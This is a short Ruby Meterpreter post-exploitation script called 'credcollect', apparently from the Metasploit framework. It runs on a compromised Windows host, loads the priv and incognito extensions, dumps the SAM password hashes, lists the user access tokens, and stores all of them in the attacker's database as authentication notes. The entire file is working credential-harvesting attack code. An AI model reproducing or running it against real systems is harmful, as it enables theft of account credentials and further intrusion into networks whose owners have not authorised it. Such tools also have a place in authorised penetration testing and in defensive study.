# $Id$
# credcollect - tebo[at]attackresearch.com

opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ]
)

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line("CredCollect -- harvest credentials found on the host and store them in the database")
		print_line("USAGE: run credcollect")
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}

# No sense trying to grab creds if we don't have any place to put them
if !client.framework.db.active
	raise RuntimeError, "Database not connected. Run db_connect first."
end


# Make sure we're rockin Priv and Incognito
client.core.use("priv") if not extensions.include?("priv")
client.core.use("incognito") if not extensions.include?("incognito")

# It wasn't me mom! Stinko did it!
hashes = client.priv.sam_hashes

# Target infos for the db record
addr = client.sock.peerhost
host = client.framework.db.report_host_state(self, addr, Msf::HostState::Alive)

# Record hashes to the running db instance as auth_HASH type
hashes.each do |user|

	type = "auth_HASH"
	data = user.to_s
	client.framework.db.queue Proc.new {
		# We'll make this look like an auth note anyway
		client.framework.db.get_note(self, host, type, data)
	}
end

# Record user tokens
tokens = client.incognito.incognito_list_tokens(0)
raise Rex::Script::Completed if not tokens

# Grab just the values
tokens = tokens.values

# Meh, tokens come to us as a formatted string
tokens = tokens.to_s.strip.split("\n")

tokens.each do |token|
	type = "auth_TOKEN"
	data = token

	client.framework.db.queue Proc.new {
		# We'll make this look like an auth note anyway
		client.framework.db.get_note(self, host, type, data)
	}
end

